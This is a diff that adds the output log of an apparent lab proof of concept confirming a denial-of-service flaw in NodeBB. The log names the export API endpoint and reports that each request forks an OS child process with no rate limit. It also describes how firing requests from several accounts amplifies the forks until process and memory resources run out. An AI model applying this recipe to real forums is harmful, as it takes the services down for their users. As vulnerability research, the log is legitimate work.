@@ -1,0 +1,15 @@
+==============================================================================
+VULN-019: Unbounded export process-fork DoS
+Target: http://localhost:21372   container: cvehunterlab_NodeBB_app
+==============================================================================
+[INFO] POST /api/v3/users/:uid/exports/:type forks a Node child per request (src/api/users.js:744-769)
+[SETUP] creating 5 unprivileged users (self-export is allowed for each)
+[SETUP] created uids [24, 25, 26, 27, 28]
+[STEP] firing 5x3 = 15 export requests concurrently (no rate limit expected)
+[INFO] export requests accepted (202): 15/15  (statuses: [202])
+[INFO] peak concurrent export-*.js child processes observed: 18
+[INFO] same-(uid,type) rapid retry: first=400, second=400 ([[error:already-exporting]])
+------------------------------------------------------------------------------
+[PROOF] 15 export requests were accepted with no rate limiting and spawned up to 18 concurrent OS child processes (> 3, i.e. beyond a single account's forks) -> unbounded fork amplification: N accounts x 3 types x re-fire = process/PID/RAM exhaustion
+[OK] exploit confirmed — each request forks a heavyweight child, no global/per-uid cooldown, no rate limit
+==> VULN-019: CONFIRMED — unbounded export process-fork DoS
